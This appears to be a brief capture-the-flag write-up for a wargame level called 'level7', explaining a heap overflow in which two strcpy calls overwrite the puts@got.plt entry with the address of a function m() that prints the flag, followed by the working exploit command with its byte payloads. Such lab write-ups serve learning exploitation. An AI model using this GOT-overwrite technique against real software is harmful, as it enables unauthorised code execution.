
heap:			0x804a008
addr m(): 		0x080484f4
addr puts@got.plt:	0x08049928 

=> The buffers are adjacent
=> The first strcpy allows us to overwrite the address of buff2 in buff3 with the address of puts@got.plt
=> So buff3[1] = addr puts@got.plt
=> Then the second strcpy will write from buff3[1] (puts@got.plt) and write the address of m() function
=> When the puts() function will be called the m() function will be executed and print c (the flag)

./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`

